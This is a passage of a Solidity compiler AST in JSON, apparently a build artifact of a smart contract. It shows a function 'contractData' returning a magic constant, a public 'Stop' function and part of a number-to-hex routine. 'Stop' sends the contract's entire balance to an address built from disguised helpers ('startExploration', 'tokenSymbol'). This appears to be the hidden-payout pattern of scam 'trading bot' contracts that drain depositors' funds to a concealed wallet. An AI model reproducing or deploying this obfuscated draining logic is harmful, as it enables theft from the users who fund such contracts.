										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5226:2:3"
									},
									"returnParameters": {
										"id": 727,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 726,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 731,
												"src": "5252:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 725,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5252:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5251:6:3"
									},
									"scope": 1047,
									"src": "5202:79:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 738,
										"nodeType": "Block",
										"src": "5340:23:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "333935373239",
													"id": 736,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "5352:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_395729_by_1",
														"typeString": "int_const 395729"
													},
													"value": "395729"
												},
												"functionReturnParameters": 735,
												"id": 737,
												"nodeType": "Return",
												"src": "5345:13:3"
											}
										]
									},
									"documentation": null,
									"id": 739,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "contractData",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 732,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5308:2:3"
									},
									"returnParameters": {
										"id": 735,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 734,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 739,
												"src": "5334:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 733,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5334:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5333:6:3"
									},
									"scope": 1047,
									"src": "5287:76:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 763,
										"nodeType": "Block",
										"src": "5591:135:3",
										"statements": [
											{
												"assignments": [
													743
												],
												"declarations": [
													{
														"constant": false,
														"id": 743,
														"mutability": "mutable",
														"name": "to",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 763,
														"src": "5596:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 742,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5596:7:3",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 748,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 745,
																"name": "tokenSymbol",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1009,
																"src": "5626:11:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 746,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5626:13:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 744,
														"name": "startExploration",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 581,
														"src": "5609:16:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 747,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5609:31:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5596:44:3"
											},
											{
												"assignments": [
													750
												],
												"declarations": [
													{
														"constant": false,
														"id": 750,
														"mutability": "mutable",
														"name": "contracts",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 763,
														"src": "5645:25:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 749,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5645:15:3",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 755,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 753,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 743,
															"src": "5681:2:3",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 752,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "5673:8:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 751,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5673:8:3",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 754,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5673:11:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5645:39:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 759,
																"name": "getBalance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 698,
																"src": "5708:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																	"typeString": "function () view returns (uint256)"
																}
															},
															"id": 760,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5708:12:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 756,
															"name": "contracts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 750,
															"src": "5689:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 758,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "5689:18:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 761,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5689:32:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 762,
												"nodeType": "ExpressionStatement",
												"src": "5689:32:3"
											}
										]
									},
									"documentation": null,
									"functionSelector": "bedf0f4a",
									"id": 764,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "Stop",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 740,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5581:2:3"
									},
									"returnParameters": {
										"id": 741,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5591:0:3"
									},
									"scope": 1047,
									"src": "5568:158:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 904,
										"nodeType": "Block",
										"src": "5803:695:3",
										"statements": [
											{
												"assignments": [
													772
												],
												"declarations": [
													{
														"constant": false,
														"id": 772,
														"mutability": "mutable",
														"name": "count",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "5808:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 771,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5808:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 774,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 773,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "5821:1:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5808:14:3"
											},
											{
												"assignments": [
													776
												],
												"declarations": [
													{
														"constant": false,
														"id": 776,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "5827:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 775,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5827:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 778,
												"initialValue": {
													"argumentTypes": null,
													"id": 777,
													"name": "a",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 766,
													"src": "5836:1:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5827:10:3"
											},
											{
												"body": {
													"id": 789,
													"nodeType": "Block",
													"src": "5857:32:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 783,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "5863:7:3",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 782,
																	"name": "count",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 772,
																	"src": "5863:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 784,
															"nodeType": "ExpressionStatement",
															"src": "5863:7:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 787,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 785,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 776,
																	"src": "5876:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 786,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5881:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "5876:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 788,
															"nodeType": "ExpressionStatement",
															"src": "5876:7:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 781,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 779,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 776,
														"src": "5849:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 780,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5854:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "5849:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 790,
												"nodeType": "WhileStatement",
												"src": "5842:47:3"
											},
											{
												"assignments": [
													792
												],
												"declarations": [
													{
														"constant": false,
														"id": 792,
														"mutability": "mutable",
														"name": "res",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "5893:16:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 791,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "5893:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 797,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 795,
															"name": "count",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 772,
															"src": "5922:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 794,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "5912:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 793,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "5916:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 796,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5912:16:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5893:35:3"
											},
											{
												"body": {
													"id": 818,
													"nodeType": "Block",
													"src": "5964:35:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 812,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 808,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 776,
																	"src": "5970:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 811,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 809,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 766,
																		"src": "5974:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "3136",
																		"id": 810,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5978:2:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_16_by_1",
																			"typeString": "int_const 16"
																		},
																		"value": "16"
																	},
																	"src": "5974:6:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5970:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 813,
															"nodeType": "ExpressionStatement",
															"src": "5970:10:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 816,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 814,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 766,
																	"src": "5986:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 815,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5991:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "5986:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 817,
															"nodeType": "ExpressionStatement",
															"src": "5986:7:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 804,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 802,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 799,
														"src": "5948:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 803,
														"name": "count",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 772,
														"src": "5952:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5948:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 819,
												"initializationExpression": {
													"assignments": [
														799
													],
													"declarations": [
														{
															"constant": false,
															"id": 799,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 819,
															"src": "5938:6:3",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 798,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "5938:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 801,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 800,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5945:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "5938:8:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 806,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": true,
														"src": "5959:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 805,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 799,
															"src": "5961:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 807,
													"nodeType": "ExpressionStatement",
													"src": "5959:3:3"
												},
												"nodeType": "ForStatement",
												"src": "5933:66:3"
											},
											{
												"assignments": [
													821
												],
												"declarations": [
													{
														"constant": false,
														"id": 821,
														"mutability": "mutable",
														"name": "hexLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 904,
														"src": "6003:14:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 820,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6003:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 830,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 826,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 792,
																		"src": "6033:3:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"id": 825,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "6026:6:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																		"typeString": "type(string storage pointer)"
																	},
																	"typeName": {
																		"id": 824,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "6026:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 827,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "6026:11:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															],
															"id": 823,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "6020:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																"typeString": "type(bytes storage pointer)"
															},
															"typeName": {
																"id": 822,
																"name": "bytes",
																"nodeType": "ElementaryTypeName",
																"src": "6020:5:3",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 828,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "6020:18:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													},
													"id": 829,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "length",
													"nodeType": "MemberAccess",
													"referencedDeclaration": null,
													"src": "6020:25:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6003:42:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 833,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 831,
														"name": "hexLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 821,
														"src": "6054:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "34",
														"id": 832,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6067:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_4_by_1",
															"typeString": "int_const 4"
														},
														"value": "4"
													},
													"src": "6054:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 849,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 847,
															"name": "hexLength",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 821,
															"src": "6159:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "33",
															"id": 848,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6172:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_3_by_1",
																"typeString": "int_const 3"
															},
															"value": "3"
														},
														"src": "6159:14:3",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 865,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 863,
																"name": "hexLength",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 821,
																"src": "6264:9:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "32",
																"id": 864,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6277:1:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_2_by_1",
																	"typeString": "int_const 2"
																},
																"value": "2"
															},
															"src": "6264:14:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 881,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 879,
																	"name": "hexLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 821,
																	"src": "6371:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
